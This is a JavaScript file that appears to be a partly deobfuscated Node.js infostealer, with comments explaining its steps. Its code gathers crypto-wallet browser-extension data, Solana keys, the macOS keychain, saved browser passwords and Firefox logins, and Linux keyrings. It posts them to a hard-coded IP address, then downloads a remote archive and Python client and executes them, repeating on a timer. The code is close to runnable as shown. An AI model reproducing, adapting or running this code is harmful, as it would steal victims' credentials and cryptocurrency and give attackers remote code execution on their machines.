Object.prototype.toString,
  Object.getOwnPropertyDescriptor,
  Object.defineProperty;
const t = "base64",
  a = "utf8",
  $ = require("fs"),
  r = require("os"),
  n = (c) => ((s1 = c.slice(1)), Buffer.from(s1, t).toString(a));

const pt = require("path"),
  request = require("request"),
  exec = require("child_process")["exec"],
  node_process = require("node:process"),
  hostname = r["hostname"](),
  platform = r["platform"](),
  homedir = r["homedir"](),
  tmpdir = r["tmpdir"]();

let e;
const l = (c) => Buffer.from(c, t).toString(a),
  s = "http://67.203.7.171:1244",
  h = (t) =>
    t.replace(/^~([a-z]+|\/)/, (t, c) =>
      "/" === c ? homedir : `${pt["dirname"](homedir)}/${c}`
    ),
  o = "ZU1RINz7",
  Z = "Z2V0",
  y = "Ly5ucGw",
  i = "d3JpdGVGaWxlU3luYw",
  d = "L2NsaWVudA",
  p = "existsSync",
  u = "TG9naW4gRGF0YQ",
  b = "Y29weUZpbGU";

function m(t) {  // check if the file or dir exists
  try {
    return $["accessSync"](t), true;
  } catch (t) {
    return false;
  }
}

const G = "default",
  W = "Profile",
  Y = "filename",
  f = "formData";
const w = "url",
  V = "options",
  v = "value",
  j = "readdirSync",
  z = "statSync",
  L = "post",
  X = "/.config/",
  g = "/Library/Application Support/",
  x = "/AppData/",
  N = "/User Data",
  R = "Google/Chrome",
  k = "BraveSoftware/Brave-Browser",
  _ = "google-chrome",
  F = [
    "Local/BraveSoftware/Brave-Browser",
    "BraveSoftware/Brave-Browser",
    "BraveSoftware/Brave-Browser",
  ],
  q = ["Local/Google/Chrome", "Google/Chrome", "google-chrome"],
  B = [
    "Roaming/Opera Software/Opera Stable",
    "com.operasoftware.Opera",
    "opera",
  ];

let U = "cmp";
const J = [
    "bmtiaWhmYmVvZ2FlYW9l",
    "ZWpiYWxiYWtvcGxjaGxn",
    "Zmhib2hpbWFlbGJvaHBq",
    "aG5mYW5rbm9jZmVvZmJk",
    "aWJuZWpkZmptbWtwY25s",
    "YmZuYWVsbW9tZWltaGxw",
    "YWVhY2hrbm1lZnBo",
    "ZWdqaWRqYnBnbGlj",
    "aGlmYWZnbWNjZHBl",
  ],
  T = [
    "aGxlZm5rb2RiZWZncGdrbm4",
    "aGVjZGFsbWVlZWFqbmltaG0",
    "YmJsZGNuZ2NuYXBuZG9kanA",
    "ZGdjaWpubWhuZm5rZG5hYWQ",
    "cGVia2xtbmtvZW9paG9mZWM",
    "bWdqbmpvcGhocGtrb2xqcGE",
    "ZXBjY2lvbmJvb2hja29ub2VlbWc",
    "aGRjb25kYmNiZG5iZWVwcGdkcGg",
    "a3Bsb21qamtjZmdvZG5oY2VsbGo",
  ],
  Q = "Y3JlYXRlUmVhZFN0cmVhbQ",
  S = async (t, c, a) => {
    let r = t;
    if (!r || "" === r) return []; // rebort if path is ""
    try {
      if (!m(r)) return []; // rebort if path not exists
    } catch (t) {
      return [];
    }
    c || (c = "");
    let n = []; // file lists to read
    const e = "Local Extension Settings",
      s = "createReadStream";
    for (let a = 0; a < 200; a++) { // a : profile index number
      const h = `${t}/${0 === a ? G : `${W} ${a}`}/${e}`; // read path for profile/local extension settings
      for (let t = 0; t < J.length; t++) {
        const e = l(J[t] + T[t]);
        let o = `${h}/${e}`; // path for dir 
        if (m(o)) { // if exists
          try {
            far = $[j](o); // get file list
          } catch (t) {
            far = [];
          }
          far.forEach(async (t) => {
            r = pt.join(o, t); // get full file path
            try {
              n.push({
                value: $["createReadStream"](r), 
                options: { filename: `${c}${a}_${e}_${t}` },
              });
            } catch (t) {}
          });
        }
      }
    }
    if (a) {
      const t = "solana_id.txt";
      if (((r = `${homedir}${"/.config/solana/id.json"}`), $["existsSync"](r)))
        try {
          n.push({
            value: $["createReadStream"](r),
            options: { filename: "solana_id.txt" },
          });
        } catch (t) {}
    }
    return C(n), n;
  },
  C = (t) => { // submit multifile data to cloud
    const c = "multi_file",
      r = {
        timestamp: e.toString(),
        type: o,
        hid: U,
        multi_file: t,
      };
    try {
      const t = {
        url: "http://67.203.7.171:1244/uploads",
        formData: r,
      };
      request["post"](t, (err, res, body) => {});
    } catch (t) {}
  },
  A = async (t, c) => {  // read browser specific files and upload
    try {
      const homedir = h("~/"); // homedir 
      let $ = ""; // default location for browsers t=q : chrome | t=F : Brave | t = B : Opera
      ($ =
        "d" == platform[0]
          ? `${homedir}${l(g)}${l(t[1])}`
          : "l" == platform[0]
          ? `${homedir}${l(X)}${l(t[2])}`
          : `${homedir}${l(x)}${l(t[0])}${l(N)}`),
        await S($, `${c}_`, 0 == c);
    } catch (t) {}
  },
  E = async () => { // for MAC ; crawl login data, chrome browser profile data and upload
    let t = [];
    const c = "Login Data",
      a = "createReadStream",
      r = "/Library/Keychains/login.keychain",
      n = "logkc-db";
    if (((pa = `${homedir}/Library/Keychains/login.keychain`), $["existsSync"](pa)))
      try {
        t.push({ value: $[a](pa), options: { filename: "logkc-db" } });
      } catch (t) {}
    else if (((pa += "-db"), $["existsSync"](pa)))
      try {
        t.push({ value: $[a](pa), options: { filename: "logkc-db" } });
      } catch (t) {}
    try {
      const r = "copyFile";
      let n = "";
      if (((n = `${homedir}"/Library/Application Support/Google/Chrome`), n && "" !== n && m(n)))
        for (let e = 0; e < 200; e++) {
          const l = `${n}/${0 === e ? G : `Profile ${e}`}/Login Data`;
          try {
            if (!m(l)) continue;
            const c = `${n}/ld_${e}`;
            m(c)
              ? t.push({ [v]: $[a](c), [V]: { [Y]: `pld_${e}` } })
              : $[r](l, c, (t) => {
                  let c = [{ [v]: $[a](l), [V]: { [Y]: `pld_${e}` } }];
                  C(c);
                });
          } catch (t) {}
        }
    } catch (t) {}
    return C(t), t;
  },
  H = async () => { // for MAC ; crawl login data, brave browser profile data and upload
    let t = [];
    const c = "Login Data",
      a = "createReadStream";
    try {
      const r = l(b);
      let n = "";
      if (((n = `${homedir}${l(g)}${l(k)}`), n && "" !== n && m(n)))
        for (let e = 0; e < 200; e++) {
          const l = `${n}/${0 === e ? G : `${W} ${e}`}/${c}`;
          try {
            if (!m(l)) continue;
            const c = `${n}/brld_${e}`;
            m(c)
              ? t.push({ [v]: $[a](c), [V]: { [Y]: `brld_${e}` } })
              : $[r](l, c, (t) => {
                  let c = [
                    {
                      [v]: $[a](l),
                      [V]: { [Y]: `brld_${e}` },
                    },
                  ];
                  C(c);
                });
          } catch (t) {}
        }
    } catch (t) {}
    return C(t), t;
  },
  M = async () => { // for MAC ; crawl login data, firefox browser profile data and upload
    let t = [];
    const c = l(Q),
      a = "key4.db",
      r = "key3.db",
      n = "logins.json";
    try {
      let e = "";
      if (((e = `${homedir}"/Library/Application Support/Firefox`), e && "" !== e && m(e)))
        for (let l = 0; l < 200; l++) {
          const s = 0 === l ? G : `${W} ${l}`;
          try {
            const r = `${e}/${s}/${a}`;
            m(r) && t.push({ [v]: $[c](r), [V]: { [Y]: `fk4_${l}` } });
          } catch (t) {}
          try {
            const a = `${e}/${s}/${r}`;
            m(a) && t.push({ [v]: $[c](a), [V]: { [Y]: `fk3_${l}` } });
          } catch (t) {}
          try {
            const a = `${e}/${s}/${n}`;
            m(a) && t.push({ [v]: $[c](a), [V]: { [Y]: `flj_${l}` } });
          } catch (t) {}
        }
    } catch (t) {}
    return C(t), t;
  },
  I = async () => {
    let t = [];
    l(u);
    const c = l(Q);
    try {
      const t = l("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");
      let a = "";
      a = `${homedir}${t}`;
      let r = [];
      if (a && "" !== a && m(a))
        try {
          r = $[j](a);
        } catch (t) {
          r = [];
        }
      r.forEach(async (t) => {
        pa = pt.join(a, t);
        try {
          ldb_data.push({ [v]: $[c](pa), [V]: { [Y]: `${t}` } });
        } catch (t) {}
      });
    } catch (t) {}
    return C(t), t;
  },
  O = async () => {
    let t = [];
    const c = l(u),
      a = l(Q);
    try {
      const r = l(b);
      let n = "";
      if (((n = `${homedir}${l(X)}${l(_)}`), n && "" !== n && m(n)))
        for (let e = 0; e < 200; e++) {
          const l = `${n}/${0 === e ? G : `${W} ${e}`}/${c}`;
          try {
            if (!m(l)) continue;
            const c = `${n}/ld_${e}`;
            m(c)
              ? t.push({ [v]: $[a](c), [V]: { [Y]: `plld_${e}` } })
              : $[r](l, c, (t) => {
                  let c = [{ [v]: $[a](l), [V]: { [Y]: `plld_${e}` } }];
                  C(c);
                });
          } catch (t) {}
        }
    } catch (t) {}
    return C(t), t;
  },
  P = async () => {
    let t = [];
    const c = l(Q),
      a = l("a2V5NC5kYg"),
      r = l("a2V5My5kYg"),
      n = l("bG9naW5zLmpzb24");
    try {
      let e = "";
      if (
        ((e = `${homedir}${l("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`), e && "" !== e && m(e))
      )
        for (let l = 0; l < 200; l++) {
          const s = 0 === l ? G : `${W} ${l}`;
          try {
            const r = `${e}/${s}/${a}`;
            m(r) &&
              t.push({
                [v]: $[c](r),
                [V]: {
                  [Y]: `flk4_${l}`,
                },
              });
          } catch (t) {}
          try {
            const a = `${e}/${s}/${r}`;
            m(a) &&
              t.push({
                [v]: $[c](a),
                [V]: {
                  [Y]: `flk3_${l}`,
                },
              });
          } catch (t) {}
          try {
            const a = `${e}/${s}/${n}`;
            m(a) &&
              t.push({
                [v]: $[c](a),
                [V]: {
                  [Y]: `fllj_${l}`,
                },
              });
          } catch (t) {}
        }
    } catch (t) {}
    return C(t), t;
  },
  D = "rmSync",
  K = "XC5weXBccHl0",
  tt = "aG9uLmV4ZQ",
  ct = 51476592;
let at = 0;
const $t = async (t) => {
    const c = `tar -xf ${t} -C ${homedir}`;
    exec(c, (c, a, r) => {
      if (c) return $["rmSync"](t), void (at = 0);
      $["rmSync"](t), lt();
    });
  },
  rt = () => {
    const t = "p2.zip",
      c = "http://67.203.7.171:1244/pdown",
      a = `${tmpdir}\\p.zi`,
      r = `${tmpdir}\\p2.zip`;
    if (at >= ct + 4) return;
    const n = "renameSync",
      e = "rename";
    if ($["existsSync"](a))
      try {
        var h = $["statSync"](a);
        h.size >= ct + 4
          ? ((at = h.size),
            $[e](a, r, (t) => {
              if (t) throw t;
              $t(r);
            }))
          : (at < h.size ? (at = h.size) : ($[D](a), (at = 0)), nt());
      } catch (t) {}
    else {
      const t = `curl -Lo "${a}" "${c}"`;
      exec(t, (t, c, e) => {
        if (t) return (at = 0), void nt();
        try {
          (at = ct + 4), $[n](a, r), $t(r);
        } catch (t) {}
      });
    }
  };
function nt() {
  setTimeout(() => {
    rt();
  }, 2e4);
}
const et = async () => { // upload some data
    vv = "4276";
    try {
      vv += node_process["argv"][1];
    } catch (t) {}
    (async (t, c) => {
      const payload = {
          ts: e.toString(),
          type: o,
          hid: U,
          ss: t,
          cc: c.toString(),
        },
        host_url = "http://67.203.7.171:1244",
        r = {
          url: "http://67.203.7.171:1244/keys",
          formData: payload,
        };
      try {
        request["post"](r, (t, c, a) => {});
      } catch (t) {}
    })("av", vv);
  };
const lt = async () => // download python files and execute them
    await new Promise((t, c) => {
      if ("w" == platform[0]) {
        const t = `${homedir}${"\.pyp\python.exe"}`;
        $["existsSync"]("\.pyp\python.exe")
          ? (() => {
              const t = s(), // cloud address
                c = "/client",
                a = "get",
                r = "writeFileSync",
                n = "/.npl",
                e = `${t}/client/${o}`,
                h = `${homedir}/.npl`,
                p = `"${homedir}\.pyp\python.exe" "${h}"`;
              try {
                $["rmSync"](h);
              } catch (t) {}
              request["get"](e, (t, c, a) => {
                if (!t)
                  try {
                    $["writeFileSync"](h, a);
                    exec(p, (t, c, a) => {});
                  } catch (t) {}
              });
            })()
          : rt();
      } else
        (() => {
          const t = s(),
            c = "/client",
            a = "writeFileSync",
            r = "get",
            n = "/.npl",
            e = "python",
            h = `${t}/client/${o}`,
            p = `${homedir}/.npl`;
          let u = `python3 "${p}"`;
          request["get"](h, (t, c, r) => {
            t || ($["writeFileSync"](p, r), exec(u, (t, c, a) => {}));
          });
        })();
    });
const main = async () => {
  try {
    (e = Date.now()),
      await (async () => {
        U = hostname;
        await et();
        try {
          const homedir = h("~/");
          await A(q, 0), // read local extension files for google
            await A(F, 1),  // brave
            await A(B, 2),  // opera
            "w" == platform[0] // win32
              ? ((pa = `${homedir}${"/AppData/Local/Microsoft/Edge"}${"User Data"}`),
                await S(pa, "3_", false))
              : "d" == platform[0] // mac
              ? (await E(), await H(), await M())
              : "l" == platform[0] && (await I(), await O(), await P()); // linux
        } catch (t) {}
      })(),
      lt();
  } catch (t) {}
};
main();
let ht = setInterval(() => {
  1, c < 5 ? main() : clearInterval(ht);
}, 6e5);
